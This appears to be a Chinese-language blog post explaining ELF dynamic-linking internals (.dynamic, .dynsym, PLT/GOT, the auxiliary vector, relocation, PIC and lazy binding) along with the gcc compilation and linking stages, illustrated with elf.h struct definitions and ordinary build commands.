<p>通常系统通过判断一个 ELF 程序是否有 <code>.interp</code> 来判断该 ELF 文件是否为动态链接程序。</p>
<h3 id="dynamic-段"><a href="#dynamic-段" class="headerlink" title=".dynamic 段"></a>.dynamic 段</h3><p>动态链接 ELF 中最重要的结构是 <code>.dynamic</code> 段，这个段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<code>.dynamic</code> 段是由<code>Elf*_Dyn</code> 构成的结构体数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure></div>
<p><code>Elf32_Dyn</code> 结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。我们这里列举几个比较常见的类型值（这些值都是定义在 <code>elf.h</code> 里面的宏），</p>
<ul>
<li><code>DT_SYMTAB</code>：指定了符号表的地址，<code>d_ptr</code> 表示 <code>.dynsym</code> 的地址。</li>
<li><code>DT_STRTAB</code>：指定了字符串表的地址，<code>d_ptr</code> 表示 <code>.synstr</code> 的地址。</li>
<li><code>DT_STRSZ</code>：指定了字符串表的大小，<code>d_val</code> 表示大小。</li>
<li><code>DT_HASH</code>：指定了符号哈希表的地址，用于加快符号查找的速度，<code>d_ptr</code> 表示 <code>.hash</code> 的地址。</li>
<li><code>DT_SONAME</code>：指定了共享库的名称。</li>
<li><code>DT_RPATH</code>：指定了库搜索路径（已废弃，不推荐使用）。</li>
<li><code>DT_INIT</code>：指定了初始化函数的地址，动态链接器在加载可执行文件或共享库时会调用该函数。</li>
<li><code>DT_FINI</code>：指定了终止函数的地址，动态链接器在程序结束时会调用该函数。</li>
<li><code>DT_NEEDED</code>：指定了需要的共享库的名称。</li>
<li><code>DT_REL/DT_RELA</code>：指定了重定位表的地址。</li>
</ul>
<h3 id="动态符号表（-dynsym）"><a href="#动态符号表（-dynsym）" class="headerlink" title="动态符号表（.dynsym）"></a>动态符号表（.dynsym）</h3><p>为了完成动态链接，最关键的还是所依赖的符号和相关文件的信息。我们知道在静态链接中，有一个专门的段叫做符号表 <code>.symtab</code>（Symbol Table），里面保存了所有关于该目标文件的符号的定义和引用。为了表示动态链接这些模块之间的符号导入导出关系，ELF 专门有一个叫做动态符号表（Dynamic Symbol Table）的段用来保存这些信息，这个段的段名通常叫做 <code>.dynsym</code>（Dynamic Symbol），同样也是由 <code>Elf*_Sym</code> 构成的结构体数组。</p>
<p>与 <code>.symtab</code> 不同的是，<code>.dynsym</code> 只保存了与动态链接相关的符号，对于那些模块内部的符号，比如模块私有变量则不保存。很多时候动态链接的模块同时拥有 <code>.dynsym</code> 和 <code>.symtab</code> 两个表，<code>.symtab</code> 中往往保存了所有符号，包括 <code>.dynsym</code> 中的符号。</p>
<p>与 <code>.symtab</code> 类似，动态符号表也需要一些辅助的表，比如用于保存符号名的字符串表。静态链接时叫做符号字符串表 <code>.strtab</code>（String Table），在这里就是动态符号字符串表 <code>.dynstr</code>（Dynamic String Table）；由于动态链接下，我们需要在程序运行时查找符号，为了加快符号的查找过程，往往还有辅助的符号哈希表（<code>.hash</code>）。</p>
<h3 id="动态链接重定位表（-rel-dyn-rel-data）"><a href="#动态链接重定位表（-rel-dyn-rel-data）" class="headerlink" title="动态链接重定位表（.rel.dyn&#x2F;.rel.data）"></a>动态链接重定位表（.rel.dyn&#x2F;.rel.data）</h3><p>共享对象需要重定位的主要原因是导入符号的存在。动态链接下，无论是可执行文件或共享对象，一旦它依赖于其他共享对象，也就是说有导入的符号时，那么它的代码或数据中就会有对于导入符号的引用。在编译时这些导入符号的地址未知，在静态链接中，这些未知的地址引用在最终链接时被修正。但是在动态链接中，导入符号的地址在运行时才确定，所以需要在运行时将这些导入符号的引用修正，即需要重定位。</p>
<p>共享对象的重定位与我们在前面“静态链接”中分析过的目标文件的重定位十分类似，唯一有区别的是目标文件的重定位是在静态链接时完成的，而共享对象的重定位是在装载时完成的。在静态链接中，目标文件里面包含有专门用于表示重定位信息的重定位表，比如 <code>.rel.text</code> 表示是代码段的重定位表，<code>.rel.data</code> 是数据段的重定位表。</p>
<p>动态链接的文件中，也有类似的重定位表分别叫做 <code>.rel.dyn</code> 和 <code>.rel.plt</code> ，它们分别相当于 <code>.rel.data</code> 和 <code>.rel.text</code> 。<code>.rel.dyn</code> 实际上是对数据引用的修正，它所修正的位置位于 <code>.got</code> 以及数据段；而 <code>.rel.plt</code> 是对函数引用的修正，它所修正的位置位于 <code>.got.plt</code> 。</p>
<h3 id="PLT-表（-plt）"><a href="#PLT-表（-plt）" class="headerlink" title="PLT 表（.plt）"></a>PLT 表（.plt）</h3><p>在未开启 FULL RELRO 的情况下 PLT 表的结构如下图所示， PLT 表在 <code>.plt</code>（有的还包括 <code>.plt.got</code>） 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108002353202.png"
                      alt="image-20241108002353202"
                ><br>PLT 表的形式如下所示：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>PLT0:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push *(GOT+8)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(GOT+16)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>bar@PLT:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(bar@GOT)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push n</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp PLT0</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp;  \text{PLT0:} \\
&amp;  \qquad  \text{push *(GOT+8)} \\
&amp;  \qquad \text{jmp *(GOT+16)} \\
&amp; \qquad  \vdots \\
&amp; \text{bar@PLT:} \\
&amp;  \qquad \text{jmp *(bar@GOT)} \\
&amp; \qquad \text{push n} \\
&amp; \qquad \text{jmp PLT0} \\
\end{align*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:12.66em;vertical-align:-6.08em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.74em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-6.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-4.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-2.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.42em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:1.92em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">PLT0:</span></span></span></span><span style="top:-7.9275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push *(GOT+8)</span></span></span></span><span style="top:-6.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(GOT+16)</span></span></span></span><span style="top:-4.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">bar@PLT:</span></span></span></span><span style="top:-1.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(bar@GOT)</span></span></span></span><span style="top:0.2325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push n</span></span></span></span><span style="top:1.7325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp PLT0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span></span></span></span></span></span></span>
<p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为函数 <code>bar</code> 在 GOT 表中的值的索引，<code>bar@GOT</code> 中初始值为 <code>jmp *(bar@GOT)</code> 指令的下一条指令，也就是说第一次调用 <code>bar</code> 函数的时候会继续执行跳转至 <code>PLT0</code> 进行 <code>bar@GOT</code> 的重定位并调用 <code>bar</code> 函数；第二次调用 <code>bar</code> 函数的时候由于 <code>bar@GOT</code> 已完成重定位因此会直接跳转至 <code>bar</code> 函数。</p>
<p>在开启 FULL RELRO 的情况下 PLT 表的结构如下图所示，此时的 PLT 表在 <code>.plt.sec</code> 而不是 <code>.plt</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108002437068.png"
                      alt="image-20241108002437068"
                ><br>由于 GOT 表在装载时已经完成重定位且不可写，因此不存在延迟绑定，PLT 直接根据 GOT 表存储的函数地址进行跳转。</p>
<h3 id="GOT-表（-got-got-plt）"><a href="#GOT-表（-got-got-plt）" class="headerlink" title="GOT 表（.got&#x2F;.got.plt）"></a>GOT 表（.got&#x2F;.got.plt）</h3><p>ELF 将 GOT 拆分成了两个表叫做 <code>.got</code> 和 <code>.got.plt</code> 。其中 <code>.got</code> 用来保存全局变量引用的地址，<code>.got.plt</code> 用来保存函数引用的地址，也就是说，所有对于外部函数的引用全部被分离出来放到了 <code>.got.plt</code> 中（当然有的 ELF 文件可能吧这两个表合并为一个 <code>.got</code> 表，结构等同于后面提到的 <code>.got.plt</code>）。另外 <code>.got.plt</code> 还有一个特殊的地方是它的前三项是有特殊意义的，分别含义如下：</p>
<ul>
<li>第一项保存的是 <code>.dynamic</code> 段的偏移（也有可能是 <code>.dynamic</code> 段的地址）。</li>
<li>第二项是一个 <code>link_map</code> 的结构体指针，里面保存着动态链接的一些相关信息，是重定位函数 <code>_dl_runtime_resolve</code> 的第一个参数。</li>
<li>第三项保存的是 <code>_dl_runtime_resolve</code> 的地址。</li>
</ul>
<p><code>.got.plt</code> 在内存中的状态如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108003009195.png"
                     
                ></p>

  <div class="note p-4 mb-4 rounded-small red info">
    <p>注意：静态链接程序也是有 plt 表和 got 表的，并且 plt 表也会被调用。</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108003049464.png"
                     
                ></p>
<h3 id="辅助信息数组"><a href="#辅助信息数组" class="headerlink" title="辅助信息数组"></a>辅助信息数组</h3><p><strong>无论静态还是动态链接程序都有辅助信息数组，只是动态链接程序是动态链接器使用辅助信息数组。</strong></p>
<p>站在动态链接器的角度看，当操作系统把控制权交给它的时候，它将开始做链接工作，那么至少它需要知道关于可执行文件和本进程的一些信息，比如可执行文件有几个段（“Segment”）、每个段的属性、程序的入口地址（因为动态链接器到时候需要把控制权交给可执行文件）等。</p>
<p>这些信息往往由操作系统传递给动态链接器，保存在进程的堆栈里面。我们在前面提到过，进程初始化的时候，事实上，堆栈里面还保存了动态链接器所需要的一些辅助信息数组（Auxiliary Vector）。辅助信息的格式也是一个结构数组，它的结构被定义在 <code>elf.h</code> ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> a_type;		<span class="comment">/* Entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> a_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that,</span></span><br><span class="line"><span class="comment">	 though, since it does not work when using 32-bit definitions</span></span><br><span class="line"><span class="comment">	 on 64-bit platforms and vice versa.  */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>a_type</code> 字段表示辅助信息数组的类型。下面是一些常见的 <code>a_type</code> 值及其对应的含义：<ul>
<li><code>AT_NULL (0)</code>：辅助向量列表的结束标志。在列表的最后一个条目中使用。</li>
<li><code>AT_IGNORE (1)</code>：忽略的辅助向量类型。在某些情况下，可以将该类型的辅助向量忽略。</li>
<li><code>AT_EXECFD (2)</code>：可执行文件的文件描述符。表示打开可执行文件的文件描述符。</li>
<li><code>AT_PHDR (3)</code>：程序头表的地址。指向程序头表在内存中的起始地址。</li>
<li><code>AT_PHENT (4)</code>：程序头表中每个条目的大小（字节）。指示每个程序头表条目的字节数。</li>
<li><code>AT_PHNUM (5)</code>：程序头表的条目数量。指示程序头表中的条目数量。</li>
<li><code>AT_PAGESZ (6)</code>：页面大小。表示操作系统使用的页面大小。</li>
<li><code>AT_BASE (7)</code>：共享对象的基地址。指向主共享对象的基地址。</li>
<li><code>AT_FLAGS (8)</code>：标志位。包含一些特定于操作系统的标志。</li>
<li><code>AT_ENTRY (9)</code>：程序入口点的地址。指向程序的入口点地址。</li>
<li><code>AT_NOTELF (10)</code>：不是ELF文件。指示加载程序的文件不是有效的ELF文件。</li>
</ul>
</li>
<li><code>a_un</code>：该成员是一个联合体（union），用于存储辅助向量条目的值。在这段代码中，由于指针类型的元素会在 32 位和 64 位平台上产生兼容性问题，所以注释中提到不再添加指针元素。<ul>
<li><code>a_val</code>：如果辅助向量条目的类型是一个整数值，那么该成员将存储该整数值。它也是一个 32 位的无符号整数。</li>
</ul>
</li>
</ul>
<h1 id="程序编译过程"><a href="#程序编译过程" class="headerlink" title="程序编译过程"></a>程序编译过程</h1><p>从源文件编译链接形成 ELF 文件的过程如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004250085.png"
                      alt="image-20241108004250085"
                ></p>
<h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>首先是源代码文件和相关的头文件，如 <code>stdio.h</code> 等被预编译器 cpp 预编译成一个 <code>.i</code> 文件。对于 C++ 程序来说，它的源代码文件的扩展名可能是 <code>.cpp</code> 或 <code>.cxx</code> ，头文件的扩展名可能是 <code>.hpp</code> ，而预编译后的文件扩展名是 <code>.ii</code> 。</p>
<p>第一步预编译的过程相当于如下命令（<code>-E</code> 表示只进行预编译）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure></div>
<p>或者：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cpp hello.c &gt; hello.i</span><br></pre></td></tr></table></figure></div>
<p>预编译过程主要处理那些源代码文件中的以 <code>#</code> 开始的预编译指令。比如 <code>#include</code> 、<code>#define</code> 等，主要处理规则如下：</p>
<ul>
<li>将所有的 <code>#define</code> 删除，并且展开所有的宏定义。</li>
<li>处理所有条件预编译指令，比如 <code>#if</code> 、<code>#ifdef</code> 、<code>#elif</code> 、<code>#else</code> 、<code>#endif</code> 。</li>
<li>处理 <code>#include</code> 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件。</li>
<li>删除所有的注释 <code>//</code> 和 <code>/* */</code> 。</li>
<li>添加行号和文件名标识，比如 <code>#2&quot;hello.c&quot;2</code> ，以便于编译时编译器产生调试用的行号信息及用于编译时产生编译错误或警告时能够显示行号。</li>
<li>保留所有的 <code>#pragma</code> 编译器指令，因为编译器须要使用它们。</li>
</ul>
<p>经过预编译后的 <code>.i</code> 文件不包含任何宏定义，因为所有的宏已经被展开，并且包含的文件也已经被插入到 <code>.i</code> 文件中。所以当我们无法判断宏定义是否正确或头文件包含是否正确时，可以查看预编译后的文件来确定问题。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生产相应的汇编代码文件，这个过程往往是我们所说的整个程序构建的核心部分，也是最复杂的部分之一。</p>
<p>上面的编译过程相当于如下命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –S hello.i –o hello.s</span><br></pre></td></tr></table></figure></div>
<h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编器是将汇编代码转变成机器可以执行的指令，每一个汇编语句几乎都对应一条机器指令。所以汇编器的汇编过程相对于编译器来讲比较简单，它没有复杂的语法，也没有语义，也不需要做指令优化，只是根据汇编指令和机器指令的对照表一一翻译就可以了，“汇编”这个名字也来源于此。</p>
<p>上面的汇编过程我们可以调用汇编器 as 来完成：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">as hello.s –o hello.o</span><br></pre></td></tr></table></figure></div>
<p>或者使用 gcc 命令从 C 源代码文件开始，经过预编译、编译和汇编直接输出目标文件（Object File）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –c hello.c –o hello.o</span><br></pre></td></tr></table></figure></div>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>静态链接是在编译过程的最后阶段将多个目标文件（如 <code>.o</code> 文件）以及所需的库文件合并在一起，生成最终的可执行文件或共享库的过程。</p>
<p>可以使用如下命令将 <code>a.o</code> 和 <code>b.o</code> 链接为目标文件 ab 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ld a.o b.o -o ab</span><br></pre></td></tr></table></figure></div>
<h3 id="合并代码和数据段（Code-and-Data-Segment-Merging）"><a href="#合并代码和数据段（Code-and-Data-Segment-Merging）" class="headerlink" title="合并代码和数据段（Code and Data Segment Merging）"></a>合并代码和数据段（Code and Data Segment Merging）</h3><p>链接器将多个目标文件中的代码段和数据段合并成一个更大的代码段和数据段。这样，所有的目标文件中的代码和数据都会被整合到最终的可执行文件或静态库中。</p>
<h3 id="符号解析（Symbol-Resolution）"><a href="#符号解析（Symbol-Resolution）" class="headerlink" title="符号解析（Symbol Resolution）"></a>符号解析（Symbol Resolution）</h3><p>链接器负通过<strong>重定位表</strong>解析目标文件中的符号引用。每个目标文件都包含对其他目标文件或库中定义的符号的引用，例如函数、变量等。链接器会检查这些引用并确定对应的定义位置。</p>
<p>对于可重定位的 ELF 文件来说，它必须包含有重定位表，用来描述如何修改相应的段里的内容。对于每个要被重定位的 ELF 段都有一个对应的重定位表，而一个重定位表往往就是 ELF 文件中的一个段，所以其实重定位表也可以叫重定位段。</p>
<p>比如代码段 <code>.text</code> 如有要被重定位的地方，那么会有一个相对应叫 <code>.rel.text</code> 的段保存了代码段的重定位表；如果代码段 <code>.data</code> 有要被重定位的地方，就会有一个相对应叫 <code>.rel.data</code> 的段保存了数据段的重定位表。</p>
<p>链接器通过 <code> Elf32_Rel</code> 的 <code> r_offset</code> 加上所在段的起始位置得到<strong>重定位入口的位置</strong>；通过 <code>r_info</code> 的低 8 为得知<strong>重定位类型</strong>；通过 <code>r_info</code> 的高 24 位得到重定位符号在符号表（<code>.symtab</code>）中的下标。</p>
<h3 id="符号重定位（Symbol-Relocation）"><a href="#符号重定位（Symbol-Relocation）" class="headerlink" title="符号重定位（Symbol Relocation）"></a>符号重定位（Symbol Relocation）</h3><p>链接器通过符号表对应的  <code> Elf32_Rel</code> 的 <code>st_value</code> 表示该符号在段中的<strong>偏移</strong>，进而可以根据<strong>重定位类型</strong>计算出重定位入口所要修正的值。最后将对应的重定位入口 patch 成正确的值。32 位静态链接常用到的重定位类型如下：</p>
<ul>
<li><code>R_386_32</code>：绝对地址。</li>
<li><code>R_386_PC32</code>：相对于当前指令地址的下一条指令相对地址。</li>
</ul>
<h3 id="解析库依赖关系（Library-Dependency-Resolution）"><a href="#解析库依赖关系（Library-Dependency-Resolution）" class="headerlink" title="解析库依赖关系（Library Dependency Resolution）"></a>解析库依赖关系（Library Dependency Resolution）</h3><p>如果目标文件依赖于外部库文件（如标准库或其他第三方库），链接器会解析这些库的依赖关系，并将所需的库文件链接到最终的可执行文件或静态库中。这样，在运行时，可执行文件或静态库就能够访问和使用这些库中提供的功能。</p>
<h3 id="生成重定位表（Relocation-Table）"><a href="#生成重定位表（Relocation-Table）" class="headerlink" title="生成重定位表（Relocation Table）"></a>生成重定位表（Relocation Table）</h3><p>链接器生成重定位表，记录了需要进行符号重定位的位置和相关信息。这些重定位表将在最终的可执行文件或静态库中被使用，以便在加载和执行时进行正确的符号重定位。</p>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>动态链接（Dynamic Linking）本质是指把链接这个过程推迟到了运行时再进行，准确的说这个过程应该放在装载部分。不过动态链接的出现很大一部分原因是为了解决内存浪费问题，因此直接照搬静态链接的方式不合理，需要做一些改变。</p>
<p>另外我们称一个程序为动态链接程序或静态链接程序指的是该程序是否有动态链接过程。</p>
<p><strong>注意动态链接不包括合并代码和数据段的过程，各个模块在内存中独立存在。</strong></p>
<h3 id="装载时重定位"><a href="#装载时重定位" class="headerlink" title="装载时重定位"></a>装载时重定位</h3><p>由于需要将多个模块装载到内存中，因此动态链接难免会有地址冲突问题，这就需要我们在加载的时候将模块中的相关地址修改为正确的值，这就是装载时重定位。</p>
<p>Linux和GCC支持这种装载时重定位的方法，在产生共享对象时，使用了两个GCC参数 <code>-shared</code> 和 <code>-fPIC</code> ，如果只使用 <code>-shared</code> ，那么输出的共享对象就是使用装载时重定位的方法。</p>
<h3 id="地址无关代码"><a href="#地址无关代码" class="headerlink" title="地址无关代码"></a>地址无关代码</h3><p>如果采用装载时重定位的方法虽然能够做到任意地址装载，但存在弊端。比如模块装载到不同位置会导致模块的代码段内容发生改变，无法实现共享库的复用，造成内存浪费；每次装载重定位会影响性能等。</p>
<p>地址无关代码的出现很好的解决了装载时重定位的缺点。地址无关代码的基本想法就是把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。这种方案就是目前被称为地址无关代码（PIC,Position-independent Code）的技术。这也就是 GCC 的 <code>-fPIC</code> 编译参数。</p>
<p>模块中各种类型的地址引用方式有以下 4 种：</p>
<ul>
<li>模块内部的函数调用、跳转等。</li>
<li>模块内部的数据访问，比如模块中定义的全局变量、静态变量。</li>
<li>模块外部的函数调用、跳转等。</li>
<li>模块外部的数据访问，比如其他模块中定义的全局变量。</li>
</ul>
<p>对于前两种引用方式由于是在模块内部，相对地址偏移固定，因此可以通过 <code>[rip + xxx]</code> （注意这里的 rip 是当前指令的<strong>下一条指令</strong>的地址，下一条指令指的是<strong>地址相邻</strong>的下一条指令）的方式进行引用，从而做到地址无关。因此关键在于后两种怎么解决。</p>
<p>模块间的访问比模块内部稍微麻烦一点，因为模块间的数据访问目标地址要等到装载时才决定，我们前面提到要使得代码地址无关，基本的思想就是把跟地址相关的部分放到数据段里面，很明显，这些其他模块的全局变量的地址是跟模块装载地址有关的。ELF 的做法是在数据段里面建立一个指向这些变量的指针数组，也被称为全局偏移表（Global Offset Table，GOT），当代码需要引用该全局变量时，可以通过 GOT 中相对应的项间接引用。</p>
<p>前面模块内部的解决方法实际上并不严谨，比如一些全局变量以及函数声明没有初始化会被认为是若弱符号，这些弱符号编译器并不知道是否只在本模块定义，因此不能仅使用 <code>[rip + xxx]</code> 的方式访问。</p>
<p>针对这种情况的解决办法是所有的使用这个变量的指令都指向位于可执行文件中的那个副本。ELF 共享库在编译时，默认都把定义在模块内部的全局变量当作定义在其他模块的全局变量，也就是说当作前面的类型四，通过 GOT 来实现变量的访问。当共享模块被装载时，如果某个全局变量在可执行文件中拥有副本，那么动态链接器就会把 GOT 中的相应地址指向该副本，这样该变量在运行时实际上最终就只有一个实例。如果变量在共享模块中被初始化，那么动态链接器还需要将该初始化值复制到程序主模块中的变量副本；如果该全局变量在程序主模块中没有副本，那么 GOT 中的相应地址就指向共享模块内部的该变量副本。<strong>这就是为什么 libc 的 GOT 表中会有自身函数。</strong></p>
<p>地址无关代码虽然解决了模块复用的问题，但是本质还是装载时重定位因此没有解决性能问题，实际上 ELF 采用了<strong>延迟绑定</strong>的方法来解决这一问题。</p>
<p>地址无关代码技术除了可以用在共享对象上面，它也可以用于<strong>可执行文件</strong>，一个以地址无关方式编译的可执行文件被称作地址无关可执行文件（<strong>PIE</strong>, Position-Independent Executable）。与 GCC 的 <code>-fPIC</code> 和 <code>-fpic</code> 参数类似，产生 PIE 的参数为 <code>-fPIE</code> 或 <code>-fpie</code> 。</p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>在动态链接下，程序模块之间包含了大量的函数引用（全局变量往往比较少，因为大量的全局变量会导致模块之间耦合度变大），所以在程序开始执行前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找以及重定位。可以想象，在一个程序运行过程中，可能很多函数在程序执行完时都不会被用到，比如一些错误处理函数或者是一些用户很少用到的功能模块等，如果一开始就把所有函数都链接好实际上是一种浪费。所以 ELF 采用了一种叫做延迟绑定（Lazy Binding）的做法，基本的思想就是当函数第一次被用到时才进行绑定（符号查找、重定位等），如果没有用到则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器来负责绑定。这样的做法可以大大加快程序的启动速度，特别有利于一些有大量函数引用和大量模块的程序。</p>
